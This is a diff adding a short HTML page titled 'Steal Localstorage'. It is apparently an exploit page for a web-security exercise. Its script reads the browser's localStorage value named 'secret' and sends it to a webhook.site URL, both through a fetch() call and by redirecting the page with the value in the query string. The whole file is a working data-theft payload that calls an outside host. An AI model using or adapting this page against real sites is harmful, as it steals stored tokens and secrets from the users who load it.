@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal Localstorage</title>
+</head>
+<body>
+    <script>
+        fetch("https://webhook.site/cff38109-ef8c-4a11-ba0b-1c418b568ee5/?"+localStorage.getItem("secret"));
+        window.location = "https://webhook.site/cff38109-ef8c-4a11-ba0b-1c418b568ee5/?"+localStorage.getItem("secret");
+    </script>
+</body>
+</html>
